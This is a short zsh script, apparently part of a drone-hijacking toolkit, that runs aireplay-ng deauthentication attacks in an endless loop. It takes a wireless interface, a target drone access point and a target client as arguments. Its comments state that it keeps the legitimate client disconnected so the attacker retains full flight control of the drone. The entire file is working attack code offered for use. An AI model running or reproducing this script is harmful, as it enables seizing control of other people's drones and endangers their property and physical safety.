#!/bin/zsh
#The command line argument 1 is the monitor interface, 2 is the target drone, 3 is the target client
#
#Purpose: to simple deauth a client on an ap in the background, allowing full flight control 
#to the attacker this file is never called on it's own but as part of the flight control selection
#in the connectToDrone.sh script

while true
do
	aireplay-ng $1 -0 10 -a $2 -c $3
done
